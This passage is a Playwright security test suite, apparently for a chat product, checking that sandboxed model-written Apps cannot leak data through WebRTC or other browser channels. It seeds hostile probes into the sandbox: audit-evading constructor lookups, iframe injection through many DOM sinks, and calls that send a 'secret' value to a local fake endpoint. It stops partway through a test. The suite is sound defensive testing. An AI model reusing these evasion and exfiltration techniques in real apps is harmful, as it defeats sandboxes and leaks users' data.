import { randomUUID } from "node:crypto";
import dgram from "node:dgram";
import net from "node:net";
import { expect, type Page, test } from "@playwright/test";
import { eq } from "drizzle-orm";
import { db } from "../../src/lib/server/db";
import {
	artifactKv,
	artifacts,
	artifactVersions,
	users,
} from "../../src/lib/server/db/schema";
import { APP_SANDBOX_CSP } from "../../src/lib/server/services/artifacts/app/sandbox-response";
import { createEmptyConversation, login } from "./helpers";

// An App is code a model wrote, running in a frame of our own page. Chromium's
// CSP does not govern WebRTC, so an App that builds a peer connection can send
// what it holds to a STUN or TURN server of its choosing: the ICE exchange
// starts the moment the connection gathers candidates, with no click and no
// request the page's policy ever sees. The App's static audit looks for the
// word RTCPeerConnection, which code that never spells it out does not trip.
//
// So the brake is in the browser: the bootstrap (the first thing the served
// document runs) takes the constructors away from the App's own realm, and, for
// a frame the App makes itself (each document has globals of its own, and the
// CSP's `webrtc 'block'` is not honoured by Chromium 147; a control below
// notices the day it is), Trusted Types with a default policy that refuses
// every way of putting markup with a frame in it into the document, plus a
// server-side refusal of an App whose own markup carries one.
//
// This spec holds every route to the line, in the product's frame and with its
// headers, against a fake STUN/TURN endpoint this process owns (UDP and TCP on
// one port). Nothing may reach it. The Apps are seeded straight into the
// database, past the write audit that would refuse the obvious ones, because
// the point is what the BROWSER does with code that got through. The controls
// are what make a silent endpoint mean something: the same routes DO reach it
// when the guard is not there.

/** What the fake endpoint saw: STUN datagrams on UDP, TURN-over-TCP connections. */
class FakeIceServer {
	datagrams = 0;
	connections = 0;
	private readonly sockets = new Set<net.Socket>();
	private constructor(
		readonly port: number,
		private readonly udp: dgram.Socket,
		private readonly tcp: net.Server,
	) {}

	static async start(): Promise<FakeIceServer> {
		for (let attempt = 0; attempt < 20; attempt += 1) {
			const udp = dgram.createSocket("udp4");
			await new Promise<void>((resolve) => udp.bind(0, "0.0.0.0", resolve));
			const port = udp.address().port;
			const tcp = net.createServer();
			try {
				await new Promise<void>((resolve, reject) => {
					tcp.once("error", reject);
					tcp.listen(port, "0.0.0.0", resolve);
				});
			} catch {
				udp.close();
				continue;
			}
			const server = new FakeIceServer(port, udp, tcp);
			udp.on("message", () => {
				server.datagrams += 1;
			});
			tcp.on("connection", (socket) => {
				server.connections += 1;
				server.sockets.add(socket);
				socket.on("close", () => server.sockets.delete(socket));
				socket.on("data", () => undefined);
				socket.on("error", () => undefined);
			});
			return server;
		}
		throw new Error("no port free for the fake ICE endpoint");
	}

	get received(): number {
		return this.datagrams + this.connections;
	}

	async stop(): Promise<void> {
		this.udp.close();
		// A browser keeps a TURN connection open; closing the server would wait for it.
		for (const socket of this.sockets) socket.destroy();
		await new Promise<void>((resolve) => this.tcp.close(() => resolve()));
	}
}

/**
 * The JS an App's own script gets: an ICE configuration that points at the
 * fake endpoint three ways (a literal address, a host name, TURN over UDP and
 * over TCP), the call that starts gathering, and the helpers each route uses.
 */
function probeLibrary(port: number): string {
	return `
var CFG = { iceServers: [
  { urls: ["stun:127.0.0.1:${port}", "stun:localhost:${port}"] },
  { urls: ["turn:127.0.0.1:${port}?transport=udp", "turn:127.0.0.1:${port}?transport=tcp"], username: "u", credential: "c" }
] };
function peer(Ctor) {
  var pc = new Ctor(CFG);
  pc.createDataChannel("x");
  pc.createOffer().then(function (o) { return pc.setLocalDescription(o); });
  return pc;
}
// What a nested document runs: the same attempt, then a word to the top page.
function PROBE_SRC(route) {
  return 'try{var pc=new RTCPeerConnection(' + JSON.stringify(CFG) + ');pc.createDataChannel("x");pc.createOffer().then(function(o){return pc.setLocalDescription(o)});top.postMessage({alfyProbe:' + JSON.stringify(route) + ',state:"constructed"},"*")}catch(e){top.postMessage({alfyProbe:' + JSON.stringify(route) + ',state:"error:"+e.name},"*")}';
}
function CHILD(route) { return "<scr" + "ipt>" + PROBE_SRC(route) + "</scr" + "ipt>"; }
function ATTR(s) { return String(s).replace(/&/g, "&amp;").replace(/"/g, "&quot;"); }
// The tag name is never written out, as a hostile app would not: the served
// route refuses a document whose text has the tag in it, so these strings are
// the ones the browser's own policy has to refuse.
var IF = "if" + "rame";
function FRAME_HTML(route, upper) {
  var tag = upper ? IF.toUpperCase() : IF;
  return "<" + tag + ' srcdoc="' + ATTR(CHILD(route)) + '"></' + tag + ">";
}
var results = {};
function attempt(name, fn) {
  try { fn(); results[name] = "ran"; } catch (e) { results[name] = "blocked:" + (e && e.name); }
}
function report() {
  window.__results = results;
  window.__done = true;
  try { window.alfy.storage.set("results", results); } catch (e) {}
}`;
}

/** A complete, valid document around one inline script (and whatever else a route needs). */
function appDocument(params: {
	script: string;
	body?: string;
	head?: string;
	/** Markup right after the script: the rest of a tag a write began. */
	tail?: string;
}): string {
	return `<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>WebRTC probe</title>${params.head ?? ""}</head>
<body>
<h1>WebRTC probe</h1>
${params.body ?? ""}
<script>
${params.script}
</script>${params.tail ?? ""}
</body>
</html>`;
}

/**
 * What follows a script that wrote `<ifr`: the rest of the tag, in the document's
 * own text, which the parser joins to what was written. The text holds no
 * `<iframe` for a scan to find, and the script holds no complete tag for a
 * policy to find; only the end of the write gives it away.
 */
function frameTagContinuation(route: string, port: number): string {
	const config = JSON.stringify({
		iceServers: [{ urls: [`stun:127.0.0.1:${port}`] }],
	});
	const child = `<script>try{var pc=new RTCPeerConnection(${config});pc.createDataChannel("x");pc.createOffer().then(function(o){return pc.setLocalDescription(o)});top.postMessage({alfyProbe:${JSON.stringify(route)},state:"constructed"},"*")}catch(e){}</script>`;
	return `ame srcdoc="${child.replace(/&/g, "&amp;").replace(/"/g, "&quot;")}"></iframe>`;
}

/**
 * A document whose script an audit cannot read: the script is stored reversed
 * and written back into the page by a decoder, which is all the audit sees.
 */
function encodedAppDocument(script: string): string {
	const reversed = [...script].reverse().join("");
	return appDocument({
		script: `document.write("<scr" + "ipt>" + ${JSON.stringify(reversed)}.split("").reverse().join("") + "</scr" + "ipt>");`,
	});
}

// ---- The routes ----------------------------------------------------------

/** Ways to reach the constructor inside the App's own realm. */
const SAME_REALM_ROUTES = `
attempt("direct", function () { peer(RTCPeerConnection); });
attempt("webkit-prefixed", function () { peer(webkitRTCPeerConnection); });
attempt("moz-prefixed", function () { peer(mozRTCPeerConnection); });
attempt("string-built-name", function () { peer(window["RTC" + "Peer" + "Connection"]); });
attempt("joined-prefixed-name", function () { peer(window[["webkit", "RTC", "PeerConnection"].join("")]); });
attempt("decoded-name", function () { peer(window[atob("UlRDUGVlckNvbm5lY3Rpb24=")]); });
attempt("globalThis", function () { peer(globalThis.RTCPeerConnection); });
attempt("self", function () { peer(self.RTCPeerConnection); });
attempt("sloppy-this", function () { peer((function () { return this; })().RTCPeerConnection); });
attempt("Reflect.get", function () { peer(Reflect.get(window, "RTCPeerConnection")); });
attempt("with-window", function () { with (window) { peer(RTCPeerConnection); } });
attempt("defaultView", function () { peer(document.defaultView.RTCPeerConnection); });
attempt("frames", function () { peer(frames.RTCPeerConnection); });
attempt("window.window", function () { peer(window.window.RTCPeerConnection); });
// A constructor reached from a prototype: anything on the global or its chain
// that can build a peer connection.
(function () {
  var found = [];
  var o = window;
  while (o) {
    Object.getOwnPropertyNames(o).forEach(function (n) {
      var v;
      try { v = o[n]; } catch (e) { return; }
      if (typeof v === "function" && v.prototype && typeof v.prototype.createOffer === "function") found.push(n);
    });
    o = Object.getPrototypeOf(o);
  }
  results["prototype-scan"] = found.length ? "found:" + found.join(",") : "none";
})();
results["descriptors"] = JSON.stringify(["RTCPeerConnection", "webkitRTCPeerConnection", "RTCDataChannel", "XSLTProcessor", "documentPictureInPicture"].map(function (n) {
  var d = Object.getOwnPropertyDescriptor(window, n);
  return d ? [n, typeof d.value, d.writable, d.configurable] : [n, "missing"];
}));
// Last, because on a tree with no guard they take the constructor away from the
// attempts above and would hide a leak: whether the names can be given back.
attempt("reassigned", function () { window.RTCPeerConnection = function () {}; peer(window.RTCPeerConnection); });
results["redefine"] = (function () {
  try { Object.defineProperty(window, "RTCPeerConnection", { get: function () { return function () {}; } }); return "allowed"; } catch (e) { return "threw"; }
})();
results["delete"] = Reflect.deleteProperty(window, "RTCPeerConnection") ? "deleted" : "kept";
report();`;

/** Ways to make a document of the App's own, with a script in it. Each one posts to the top page if its script ran. */
const NESTED_ROUTES = `
function frame() { var f = document.createElement("iframe"); return f; }
function add(node) { document.body.appendChild(node); return node; }
attempt("srcdoc-property", function () { var f = frame(); f.srcdoc = CHILD("srcdoc-property"); add(f); });
attempt("srcdoc-setAttribute", function () { var f = frame(); f.setAttribute("srcdoc", CHILD("srcdoc-setAttribute")); add(f); });
attempt("srcdoc-attribute-node", function () { var f = frame(); var a = document.createAttribute("srcdoc"); a.value = CHILD("srcdoc-attribute-node"); f.setAttributeNode(a); add(f); });
attempt("srcdoc-setAttributeNS", function () { var f = frame(); f.setAttributeNS(null, "srcdoc", CHILD("srcdoc-setAttributeNS")); add(f); });
attempt("srcdoc-after-insert", function () { var f = add(frame()); f.setAttribute("srcdoc", CHILD("srcdoc-after-insert")); });
attempt("srcdoc-uppercase-name", function () { var f = frame(); f.setAttribute("SRCDOC", CHILD("srcdoc-uppercase-name")); add(f); });
attempt("innerHTML", function () { var d = document.createElement("div"); d.innerHTML = FRAME_HTML("innerHTML"); add(d); });
attempt("insertAdjacentHTML", function () { document.body.insertAdjacentHTML("beforeend", FRAME_HTML("insertAdjacentHTML")); });
attempt("outerHTML", function () { var d = add(document.createElement("div")); d.outerHTML = FRAME_HTML("outerHTML"); });
attempt("DOMParser-import", function () {
  var doc = new DOMParser().parseFromString(FRAME_HTML("DOMParser-import"), "text/html");
  add(document.importNode(doc.querySelector("iframe"), true));
});
attempt("template-clone", function () {
  var t = document.createElement("template");
  t.innerHTML = FRAME_HTML("template-clone");
  add(t.content.cloneNode(true));
});
attempt("createContextualFragment", function () {
  var r = document.createRange();
  r.selectNode(document.body);
  add(r.createContextualFragment(FRAME_HTML("createContextualFragment")));
});
attempt("setHTMLUnsafe", function () { var d = document.createElement("div"); d.setHTMLUnsafe(FRAME_HTML("setHTMLUnsafe")); add(d); });
attempt("shadow-setHTMLUnsafe", function () {
  var h = document.createElement("div");
  h.attachShadow({ mode: "open" }).setHTMLUnsafe(FRAME_HTML("shadow-setHTMLUnsafe"));
  add(h);
});
attempt("parseHTMLUnsafe", function () {
  var doc = Document.parseHTMLUnsafe(FRAME_HTML("parseHTMLUnsafe"));
  add(document.importNode(doc.querySelector("iframe"), true));
});
attempt("svg-foreignObject", function () {
  var d = document.createElement("div");
  d.innerHTML = "<svg><foreignObject>" + FRAME_HTML("svg-foreignObject", true) + "</foreignObject></svg>";
  add(d);
});
attempt("execCommand", function () {
  document.designMode = "on";
  document.body.focus();
  if (!document.execCommand("insertHTML", false, FRAME_HTML("execCommand"))) throw new Error("refused");
});
attempt("javascript-url-source", function () { var f = frame(); f.src = "javascript:" + PROBE_SRC("javascript-url-source"); add(f); });
attempt("blob-frame", function () {
  var f = frame();
  f.src = URL.createObjectURL(new Blob(["<!doctype html>" + CHILD("blob-frame")], { type: "text/html" }));
  add(f);
});
attempt("data-frame", function () { var f = frame(); f.src = "data:text/html," + encodeURIComponent("<!doctype html>" + CHILD("data-frame")); add(f); });
attempt("object-data", function () {
  var o = document.createElement("object");
  o.type = "text/html";
  o.data = "data:text/html," + encodeURIComponent("<!doctype html>" + CHILD("object-data"));
  add(o);
});
attempt("embed-src", function () {
  var e = document.createElement("embed");
  e.type = "text/html";
  e.src = "data:text/html," + encodeURIComponent("<!doctype html>" + CHILD("embed-src"));
  add(e);
});
attempt("blank-frame-contentWindow", function () { var f = add(frame()); peer(f.contentWindow.RTCPeerConnection); });
attempt("blank-frame-index", function () { add(frame()); peer(window[0].RTCPeerConnection); });
attempt("blank-frame-javascript-location", function () { var f = add(frame()); f.contentWindow.location = "javascript:" + PROBE_SRC("blank-frame-javascript-location"); });
attempt("anchor-into-frame", function () {
  var f = frame(); f.name = "kid"; add(f);
  var a = document.createElement("a"); a.href = "javascript:" + PROBE_SRC("anchor-into-frame"); a.target = "kid"; add(a); a.click();
});
// XSLT builds the attribute itself, so no string with a frame in it passes a sink.
attempt("xslt", function () {
  var X = "http://www.w3.org/1999/XSL/Transform", H = "http://www.w3.org/1999/xhtml";
  var ss = document.implementation.createDocument(X, "xsl:stylesheet", null);
  ss.documentElement.setAttribute("version", "1.0");
  var out = ss.createElementNS(X, "xsl:output"); out.setAttribute("method", "html"); ss.documentElement.appendChild(out);
  var tpl = ss.createElementNS(X, "xsl:template"); tpl.setAttribute("match", "/");
  var fr = ss.createElementNS(H, "iframe");
  var at = ss.createElementNS(X, "xsl:attribute"); at.setAttribute("name", "srcdoc");
  var tx = ss.createElementNS(X, "xsl:text"); tx.textContent = CHILD("xslt");
  at.appendChild(tx); fr.appendChild(at); tpl.appendChild(fr); ss.documentElement.appendChild(tpl);
  var p = new XSLTProcessor(); p.importStylesheet(ss);
  add(p.transformToFragment(document.implementation.createDocument(null, "r", null), document));
});
attempt("window.open", function () { if (window.open("about:blank")) throw new Error("opened"); });
report();`;

/** Writes during parsing, whole and in pieces: the pieces join in the parser, not in the string. */
const WRITE_ROUTES = `
(function () {
  var all = FRAME_HTML("document-write");
  attempt("document-write", function () { document.write(all); });
  var split = FRAME_HTML("document-write-split");
  attempt("document-write-split", function () {
    document.write(split.slice(0, 4));
    document.write(split.slice(4, 9));
    document.write(split.slice(9));
  });
  var one = FRAME_HTML("document-write-one-char");
  attempt("document-write-one-char", function () { for (var i = 0; i < one.length; i += 1) document.write(one.charAt(i)); });
  attempt("document-writeln", function () { document.writeln(FRAME_HTML("document-writeln")); });
  // Ends where a frame tag could be going; the document's own text finishes it.
  attempt("document-write-prefix", function () { document.write("<" + "ifr"); });
})();
window.addEventListener("load", report);`;

// ---- Harness -------------------------------------------------------------

async function testUserId(): Promise<string> {
	const [user] = await db
		.select({ id: users.id })
		.from(users)
		.where(eq(users.email, "admin@local"))
		.limit(1);
	expect(user, "the e2e admin must exist").toBeTruthy();
	return user.id;
}

async function seedApp(
	conversationId: string,
	html: string,
): Promise<{ artifactId: string; versionId: string }> {
	const userId = await testUserId();
	const artifactId = randomUUID();
	const versionId = randomUUID();
	const now = new Date();
	await db.insert(artifacts).values({
		id: artifactId,
		userId,
		conversationId,
		type: "artifact",
		retrievalClass: "durable",
		name: "WebRTC probe",
		contentText: html,
		metadataJson: JSON.stringify({
			artifactType: "app",
			title: "WebRTC probe",
		}),
		createdAt: now,
		updatedAt: now,
	});
	await db.insert(artifactVersions).values({
		id: versionId,
		artifactId,
		userId,
		versionNumber: 1,
		author: "alfy",
		summary: "Seeded past the write audit",
		body: html,
		bodyHash: `seed-${versionId}`,
		createdAt: now,
	});
	return { artifactId, versionId };
}

/** Opens the App in the panel, in the product's own frame. */
async function openApp(page: Page, conversationId: string) {
	await page.goto(`/chat/${conversationId}`, { waitUntil: "networkidle" });
	await page.getByTestId("artifact-count-button").click();
	await page
		.getByTestId("artifact-panel-list")
		.getByTestId("artifact-row")
		.first()
		.click();
	await expect(
		page.locator("iframe.app-frame, .app-frame-tripwire").first(),
	).toBeVisible();
}

/** What an App's script reported through the real storage bridge. */
async function readResults(
	artifactId: string,
): Promise<Record<string, string> | null> {
	const [row] = await db
		.select({ valueJson: artifactKv.valueJson })
		.from(artifactKv)
		.where(eq(artifactKv.artifactId, artifactId));
	return row ? (JSON.parse(row.valueJson) as Record<string, string>) : null;
}

/** The probes a nested document posted to the top page, if any script ran in one. */
async function nestedProbes(page: Page): Promise<unknown[]> {
	return page.evaluate(
		() => (window as unknown as { __probes?: unknown[] }).__probes ?? [],
	);
}

/** Time for gathering to start, a STUN request to go out and a TURN connection to open. */
const SETTLE_MS = 3_000;

function withoutTrustedTypes(csp: string): string {
	return csp
		.split("; ")
		.filter(
			(part) => !/^(require-trusted-types-for|trusted-types)\b/.test(part),
		)
		.join("; ");
}

/** Serves `html` as the App's document, with the given policy and no bootstrap: the document the guard is missing from. */
async function serveUnguarded(
	page: Page,
	artifactId: string,
	html: string,
	csp: string,
) {
	await page.route(
		new RegExp(`/api/artifacts/${artifactId}/app(\\?|$)`),
		(route) =>
			route.fulfill({
				status: 200,
				headers: {
					"content-type": "text/html; charset=utf-8",
					"content-security-policy": csp,
					"cache-control": "no-store",
				},
				body: html,
			}),
	);
}

function appRoute(artifactId: string): string {
	return `/api/artifacts/${artifactId}/app`;
}

let ice: FakeIceServer;
/** What the page and its frames said in the console, shown only when a test fails. */
let consoleLog: string[] = [];

test.describe("an App reaching a STUN or TURN server through WebRTC", () => {
	test.beforeEach(async ({ page }) => {
		ice = await FakeIceServer.start();
		consoleLog = [];
		page.on("pageerror", (error) =>
			consoleLog.push(`pageerror: ${error.message}`),
		);
		page.on("console", (message) => {
			if (message.type() === "error" || message.type() === "warning") {
				consoleLog.push(`${message.type()}: ${message.text().slice(0, 240)}`);
			}
		});
		await page.addInitScript(() => {
			if (window !== window.top) return;
			const probes: unknown[] = [];
			(window as unknown as { __probes: unknown[] }).__probes = probes;
			window.addEventListener("message", (event) => {
				const data = event.data as { alfyProbe?: string } | null;
				if (data && typeof data === "object" && "alfyProbe" in data) {
					probes.push(data);
				}
			});
		});
		await login(page);
	});

	test.afterEach(async ({ page }, testInfo) => {
		await ice.stop();
		if (testInfo.status !== testInfo.expectedStatus) {
			console.log(
				`console of "${testInfo.title}" (${page.url()}):\n${consoleLog.slice(0, 20).join("\n")}`,
			);
		}
	});

	// ---- Controls: what makes a silent endpoint mean something -------------

	test("control: a page outside the product's frames reaches the endpoint, so this harness sees WebRTC at all", async ({
		page,
	}) => {
		const lone = await page.context().newPage();
		await lone.goto("about:blank");
		await lone.evaluate(
			({ port }) => {
				const pc = new RTCPeerConnection({
					iceServers: [
						{ urls: [`stun:127.0.0.1:${port}`] },
						{
							urls: [`turn:127.0.0.1:${port}?transport=tcp`],
							username: "u",
							credential: "c",
						},
					],
				});
				pc.createDataChannel("x");
				return pc.createOffer().then((offer) => pc.setLocalDescription(offer));
			},
			{ port: ice.port },
		);

		await expect
			.poll(() => ice.datagrams, {
				message: "no STUN datagram arrived: the harness cannot see WebRTC",
				timeout: 20_000,
			})
			.toBeGreaterThan(0);
		// The TURN connection opens a gathering phase after the STUN request goes
		// out (libwebrtc spaces its phases 50 ms apart), so it is waited for too.
		await expect
			.poll(() => ice.connections, {
				message:
					"no TURN-over-TCP connection arrived: the harness cannot see TURN",
				timeout: 20_000,
			})
			.toBeGreaterThan(0);
		await lone.close();
	});

	test("control: the product's sandbox and CSP alone do not stop a peer connection", async ({
		page,
	}) => {
		const conversationId = await createEmptyConversation(page, "Control A");
		const { artifactId } = await seedApp(conversationId, "<p>placeholder</p>");
		await serveUnguarded(
			page,
			artifactId,
			appDocument({
				script: `${probeLibrary(ice.port)}\nattempt("direct", function () { peer(RTCPeerConnection); });\nreport();`,
			}),
			APP_SANDBOX_CSP,
		);

		await openApp(page, conversationId);

		await expect
			.poll(() => ice.datagrams, {
				message:
					"the unguarded document did not reach the endpoint: the CSP is stopping WebRTC after all",
				timeout: 20_000,
			})
			.toBeGreaterThan(0);
	});

	test("control: this Chromium does not honour the CSP webrtc directive (when it does, add `webrtc 'block'` to APP_SANDBOX_CSP and delete this control)", async ({
		page,
	}) => {
		const conversationId = await createEmptyConversation(page, "Control B");
		const { artifactId } = await seedApp(conversationId, "<p>placeholder</p>");
		await serveUnguarded(
			page,
			artifactId,
			appDocument({
				script: `${probeLibrary(ice.port)}\nattempt("direct", function () { peer(RTCPeerConnection); });\nreport();`,
			}),
			`${APP_SANDBOX_CSP}; webrtc 'block'`,
		);

		await openApp(page, conversationId);

		await expect
			.poll(() => ice.datagrams, {
				message:
					"a document with `webrtc 'block'` reached nothing: Chromium now honours it. Add it to APP_SANDBOX_CSP, record it in ADR-0068, and replace this control with a real test",
				timeout: 20_000,
			})
			.toBeGreaterThan(0);
	});

	test("control: a frame the App makes runs its own script and reaches the endpoint when nothing guards it", async ({
		page,
	}) => {
		const conversationId = await createEmptyConversation(page, "Control C");
		const { artifactId } = await seedApp(conversationId, "<p>placeholder</p>");
		await serveUnguarded(
			page,
			artifactId,
			appDocument({
				script: `${probeLibrary(ice.port)}
attempt("srcdoc", function () { var f = document.createElement("iframe"); f.srcdoc = CHILD("srcdoc"); document.body.appendChild(f); });
report();`,
			}),
			// The policy as it was before Trusted Types: the same sandbox, the same
			// directives, no sink that refuses a frame.
			withoutTrustedTypes(APP_SANDBOX_CSP),
		);

		await openApp(page, conversationId);

		await expect
			.poll(() => ice.datagrams, {
				message:
					"the nested frame reached nothing: the route this spec guards is not real in this browser",
				timeout: 20_000,
			})
			.toBeGreaterThan(0);
		// The frame's word to the top page and its datagram arrive by unrelated
		// paths, a few milliseconds apart, so the word is waited for too.
		await expect
			.poll(() => nestedProbes(page), {
				message: "the nested frame's script never reported to the top page",
				timeout: 20_000,
			})
			.toEqual([{ alfyProbe: "srcdoc", state: "constructed" }]);
	});

	// ---- The guard ---------------------------------------------------------

	test("the App's own realm: no route to the constructor is left, and nothing reaches the endpoint", async ({
		page,
	}) => {
		const conversationId = await createEmptyConversation(page, "Same realm");
		const { artifactId } = await seedApp(
			conversationId,
			appDocument({ script: `${probeLibrary(ice.port)}${SAME_REALM_ROUTES}` }),
		);

		await openApp(page, conversationId);

		await expect
			.poll(() => readResults(artifactId), {
				message: "the App never reported in; its script did not run",
				timeout: 20_000,
			})
			.not.toBeNull();
		await page.waitForTimeout(SETTLE_MS);

		const results = (await readResults(artifactId)) ?? {};
		// A route that "ran" is one that built a peer connection.
		const ran = Object.entries(results)
			.filter(([, value]) => value === "ran")
			.map(([name]) => name);
		expect(ran, "routes that built a peer connection").toEqual([]);
		expect(results["prototype-scan"]).toBe("none");
		expect(results.redefine, "defineProperty over the name").toBe("threw");
		expect(results.delete, "delete of the name").toBe("kept");
		// The names are present, empty, and cannot be given back a value.
		expect(JSON.parse(results.descriptors)).toEqual([
			["RTCPeerConnection", "undefined", false, false],
			["webkitRTCPeerConnection", "undefined", false, false],
			["RTCDataChannel", "undefined", false, false],
			["XSLTProcessor", "undefined", false, false],
			["documentPictureInPicture", "undefined", false, false],
		]);
		expect(ice.datagrams, "STUN datagrams").toBe(0);
		expect(ice.connections, "TURN connections").toBe(0);
	});

	test("a frame the App makes itself runs no script of its own, by any way of making one", async ({
		page,
	}) => {
		const conversationId = await createEmptyConversation(page, "Nested");
		const { artifactId } = await seedApp(
			conversationId,
			appDocument({ script: `${probeLibrary(ice.port)}${NESTED_ROUTES}` }),
		);

		await openApp(page, conversationId);

		await expect
			.poll(() => readResults(artifactId), {
				message: "the App never reported in; its script did not run",
				timeout: 20_000,
			})
			.not.toBeNull();
		await page.waitForTimeout(SETTLE_MS);

		const probes = await nestedProbes(page);
		expect(probes, "nested documents that ran the App's script").toEqual([]);
		expect(ice.datagrams, "STUN datagrams").toBe(0);
		expect(ice.connections, "TURN connections").toBe(0);

		const results = (await readResults(artifactId)) ?? {};
		// The route either failed where the App tried it, or made a document that
		// has no script of ours in it (a blank frame, a frame that was blocked from
		// loading): never a connection.
		for (const route of [
			"srcdoc-property",
			"srcdoc-setAttribute",
			"srcdoc-attribute-node",
			"srcdoc-setAttributeNS",
			"srcdoc-after-insert",
			"srcdoc-uppercase-name",
			"innerHTML",
			"insertAdjacentHTML",
			"outerHTML",
			"DOMParser-import",
			"template-clone",
			"createContextualFragment",
			"setHTMLUnsafe",
			"shadow-setHTMLUnsafe",
			"parseHTMLUnsafe",
			"svg-foreignObject",
			"execCommand",
			"xslt",
		]) {
			expect(results[route], `${route} made a frame with content`).toMatch(
				/^blocked:/,
			);
		}
		for (const route of ["blank-frame-contentWindow", "blank-frame-index"]) {
			expect(results[route], `${route} reached into a frame`).toMatch(
				/^blocked:/,
			);
		}
	});

	test("document.write cannot make a frame either, whole or in pieces", async ({
		page,
	}) => {
		const conversationId = await createEmptyConversation(page, "Writes");
		const { artifactId } = await seedApp(
			conversationId,
			appDocument({
				script: `${probeLibrary(ice.port)}${WRITE_ROUTES}`,
				tail: frameTagContinuation("document-write-prefix", ice.port),
			}),
		);

		await openApp(page, conversationId);

		await expect
			.poll(() => readResults(artifactId), {
				message: "the App never reported in; its script did not run",
				timeout: 20_000,
			})
			.not.toBeNull();
		await page.waitForTimeout(SETTLE_MS);

		expect(await nestedProbes(page), "nested documents that ran").toEqual([]);
		expect(ice.datagrams, "STUN datagrams").toBe(0);
		expect(ice.connections, "TURN connections").toBe(0);
		const results = (await readResults(artifactId)) ?? {};
		expect(results["document-write"]).toMatch(/^blocked:/);
		expect(results["document-write-split"]).toMatch(/^blocked:/);
		expect(results["document-write-prefix"]).toMatch(/^blocked:/);
	});

	test("an App whose own markup carries a frame is not served, and the page says so", async ({
		page,
	}) => {
		const staticVectors: Record<string, string> = {
			"iframe with srcdoc": `<iframe srcdoc="&lt;script&gt;try{new RTCPeerConnection({iceServers:[{urls:['stun:127.0.0.1:${ice.port}']}]}).createDataChannel('x')}catch(e){}&lt;/script&gt;"></iframe>`,
			"upper-case iframe with a javascript: source": `<IFRAME SRC="javascript:try{var pc=new RTCPeerConnection({iceServers:[{urls:['stun:127.0.0.1:${ice.port}']}]});pc.createDataChannel('x');pc.createOffer().then(function(o){pc.setLocalDescription(o)})}catch(e){}"></IFRAME>`,
			"slash after the tag name": `<iframe/srcdoc="&lt;script&gt;1&lt;/script&gt;"></iframe>`,
			"a frame inside a template that a script clones": `<template id="t"><iframe srcdoc="&lt;script&gt;1&lt;/script&gt;"></iframe></template><script>document.body.appendChild(document.getElementById("t").content.cloneNode(true))</script>`,
			object: `<object data="data:text/html,%3Cscript%3E1%3C/script%3E" type="text/html"></object>`,
			embed: `<embed src="data:text/html,%3Cscript%3E1%3C/script%3E" type="text/html">`,
		};

		for (const [name, markup] of Object.entries(staticVectors)) {
			const conversationId = await createEmptyConversation(page, "Static");
			const { artifactId } = await seedApp(
				conversationId,
				appDocument({ script: "window.__ran = true;", body: markup }),
			);
			const response = await page.request.get(appRoute(artifactId));
			expect(response.status(), `${name}: status`).toBe(422);
			const csp = response.headers()["content-security-policy"] ?? "";
			expect(csp, `${name}: the notice still carries the App policy`).toBe(
				APP_SANDBOX_CSP,
			);
			const body = await response.text();
			expect(body, `${name}: the notice`).toContain("cannot run");
			expect(body, `${name}: nothing of the App is served`).not.toContain(
				"__ran",
			);
		}

		// And in the product's frame, a person sees the notice and nothing leaves.
		const conversationId = await createEmptyConversation(page, "Static frame");
		await seedApp(
			conversationId,
			appDocument({
				script: "window.__ran = true;",
				body: staticVectors["iframe with srcdoc"],
			}),
		);
		await openApp(page, conversationId);
		await expect(
			page.frameLocator("iframe.app-frame").locator("body"),
		).toContainText("cannot run");
		await page.waitForTimeout(SETTLE_MS);
		expect(ice.received, "what reached the endpoint").toBe(0);
	});

	test("the channels the CSP does govern still reach nothing, by the same measure", async ({
		page,
	}) => {
		const conversationId = await createEmptyConversation(page, "Channels");
		const { artifactId } = await seedApp(
			conversationId,
			appDocument({
				script: `${probeLibrary(ice.port)}
var base = "http://127.0.0.1:${ice.port}/leak?d=secret";
function link(rel, extra) { var l = document.createElement("link"); l.rel = rel; l.href = base; if (extra) l.as = extra; document.head.appendChild(l); }
attempt("fetch", function () { fetch(base).catch(function () {}); });
attempt("xhr", function () { var x = new XMLHttpRequest(); x.open("GET", base); x.onerror = function () {}; x.send(); });
attempt("websocket", function () { var w = new WebSocket("ws://127.0.0.1:${ice.port}/x"); w.onerror = function () {}; });
attempt("eventsource", function () { var e = new EventSource(base); e.onerror = function () {}; });
attempt("beacon", function () { navigator.sendBeacon(base, "x"); });
attempt("image", function () { new Image().src = base; });
attempt("webtransport", function () { var w = new WebTransport("https://127.0.0.1:${ice.port}/x"); w.ready.catch(function () {}); w.closed.catch(function () {}); });
attempt("preconnect", function () { link("preconnect"); });
attempt("prefetch", function () { link("prefetch"); });
attempt("dns-prefetch", function () { link("dns-prefetch"); });
attempt("preload", function () { link("preload", "fetch"); });
attempt("stylesheet", function () { link("stylesheet"); });
attempt("ping", function () { var a = document.createElement("a"); a.href = "#"; a.ping = base; document.body.appendChild(a); a.click(); });
attempt("css-url", function () { var d = document.createElement("div"); d.style.backgroundImage = "url(" + base + ")"; document.body.appendChild(d); });
attempt("audio", function () { new Audio(base); });
attempt("video", function () { var v = document.createElement("video"); v.src = base; document.body.appendChild(v); });
attempt("css-import", function () { var s = document.createElement("style"); s.textContent = "@import url(" + base + ");"; document.head.appendChild(s); });
attempt("font", function () { var s = document.createElement("style"); s.textContent = "@font-face{font-family:x;src:url(" + base + ")}body{font-family:x}"; document.head.appendChild(s); });
attempt("worker", function () { new Worker(URL.createObjectURL(new Blob(["1"]))); });
report();`,
			}),
		);

		await openApp(page, conversationId);

		await expect
			.poll(() => readResults(artifactId), {
				message: "the App never reported in; its script did not run",
				timeout: 20_000,
			})
			.not.toBeNull();
		await page.waitForTimeout(SETTLE_MS);

		expect(ice.datagrams, "datagrams to the endpoint").toBe(0);
		expect(ice.connections, "connections to the endpoint").toBe(0);
	});

	test("the guard outlives the App's own document.open() and a reload", async ({
		page,
	}) => {
		const conversationId = await createEmptyConversation(page, "Reopened");
		const { artifactId } = await seedApp(
			conversationId,
			appDocument({
				script: `${probeLibrary(ice.port)}
window.addEventListener("load", function () {
  document.open();
  document.write("<p>rewritten</p>");
  document.close();
  attempt("after-open", function () { peer(RTCPeerConnection); });
  results["typeof"] = typeof RTCPeerConnection;
  report();
});`,
			}),
		);

		await page.goto(appRoute(artifactId));
		await page.waitForFunction(
			() => (window as unknown as { __done?: boolean }).__done === true,
			undefined,
			{ timeout: 15_000 },
		);
		const results = await page.evaluate(
			() =>
				(window as unknown as { __results: Record<string, string> }).__results,
		);
